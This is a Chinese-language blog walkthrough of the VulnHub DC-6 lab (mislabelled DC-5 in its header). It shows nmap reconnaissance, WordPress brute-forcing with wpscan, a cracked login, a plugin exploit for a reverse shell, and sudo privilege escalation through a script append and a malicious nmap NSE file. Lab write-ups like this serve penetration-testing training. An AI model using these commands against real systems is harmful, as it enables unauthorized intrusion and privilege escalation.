---
# 这是页面的图标
icon: api
# 这是文章的标题
title: DC-5Walkthrough
# 设置作者
author: lhz
# 设置写作时间
time: 2021-10-05
# 一个页面只能有一个分类
category: 渗透
# 一个页面可以有多个标签
tag:
  - 渗透
  - vulnhub
  - DC5
comment: false

typora-root-url: ..\..\..\..\.vuepress\public


---

## 0x01 介绍

靶机地址：

> https://www.vulnhub.com/entry/dc-6,315/

**DESCRIPTION**

DC-6 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.

This isn't an overly difficult challenge so should be great for beginners.

The ultimate goal of this challenge is to get root and to read the one and only flag.

Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.

For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won't give you the answer, instead, I'll give you an idea about how to move forward.

OK, this isn't really a clue as such, but more of some "we don't want to spend five years waiting for a certain process to finish" kind of advice for those who just want to get on with the job.

`cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt` That should save you a few years. ;-)

**NOTE: You WILL need to edit your hosts file on your pentesting device so that it reads something like:**

```
192.168.0.142 wordy
```

## 0x02 信息收集

扫描IP

```
nmap -sP 172.16.89.0/24
```

![image-20211005150145884](/assets/img/image-20211005150145884.png)

发现ip：172.16.89.7

进一步扫描

```
nmap -T5 -A -v -p- 172.16.89.7
```

结果

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-05 15:02 CST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 15:02
Completed NSE at 15:02, 0.00s elapsed
Initiating NSE at 15:02
Completed NSE at 15:02, 0.00s elapsed
Initiating NSE at 15:02
Completed NSE at 15:02, 0.00s elapsed
Initiating ARP Ping Scan at 15:02
Scanning 172.16.89.7 [1 port]
Completed ARP Ping Scan at 15:02, 0.02s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:02
Completed Parallel DNS resolution of 1 host. at 15:02, 0.00s elapsed
Initiating SYN Stealth Scan at 15:02
Scanning 172.16.89.7 [65535 ports]
Discovered open port 22/tcp on 172.16.89.7
Discovered open port 80/tcp on 172.16.89.7
Completed SYN Stealth Scan at 15:02, 5.10s elapsed (65535 total ports)
Initiating Service scan at 15:02
Scanning 2 services on 172.16.89.7
Completed Service scan at 15:02, 6.54s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 172.16.89.7
NSE: Script scanning 172.16.89.7.
Initiating NSE at 15:02
Completed NSE at 15:02, 0.65s elapsed
Initiating NSE at 15:02
Completed NSE at 15:02, 0.03s elapsed
Initiating NSE at 15:02
Completed NSE at 15:02, 0.00s elapsed
Nmap scan report for 172.16.89.7
Host is up (0.0010s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)
|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)
|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Did not follow redirect to http://wordy/
MAC Address: 00:0C:29:9F:2E:8D (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Uptime guess: 198.048 days (since Sun Mar 21 13:53:15 2021)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   1.04 ms 172.16.89.7

NSE: Script Post-scanning.
Initiating NSE at 15:02
Completed NSE at 15:02, 0.00s elapsed
Initiating NSE at 15:02
Completed NSE at 15:02, 0.00s elapsed
Initiating NSE at 15:02
Completed NSE at 15:02, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.14 seconds
           Raw packets sent: 65558 (2.885MB) | Rcvd: 65550 (2.623MB)
```

修改host文件

```
echo "172.16.89.7 wordy" >> /etc/hosts
```

访问http://wordy，发现目标是wordpress搭建的网站

![image-20211005150502759](/assets/img/image-20211005150502759.png)

## 0x03 渗透

使用wps扫描网站用户

```
wpscan --url http://wordy --enumerate u
```

根据提示生成密码字典

```
cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt
```

使用wpscan爆破

```
wpscan --url http://wordy --passwords passwords.txt
```

爆破出一个账号：mark，密码：helpdesk01

![image-20211005162459020](/assets/img/image-20211005162459020.png)

使用爆破得到的账号登陆后，发现安装有Active Monitor插件

```
searchsploit Activity Monitor -w
```

发现存在漏洞

https://www.exploit-db.com/exploits/50110

下载利用，得到shell，在kali上回弹shell

![image-20211005162756068](/assets/img/image-20211005162756068.png)

升级shell

```
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

翻一下/home，在mark下发现graham的密码

![image-20211005163415161](/assets/img/image-20211005163415161.png)

切换用户到graham，运行sudo -l

![image-20211005164152979](/assets/img/image-20211005164152979.png)

可以使用jens权限执行sh脚本，获得jens权限

```bash
echo "/bin/sh" >> /home/jens/backups.sh
sudo -u jens /home/jens/backups.sh
```

执行sudo -l

![image-20211005164709678](/assets/img/image-20211005164709678.png)

可以执行nmap，参考前面nmap越权方法

```bash
echo 'os.execute("/bin/sh")' > /tmp/root.nse
cat /tmp/root.nse
sudo nmap --script=/tmp/root.nse
```

![image-20211005164930280](/assets/img/image-20211005164930280.png)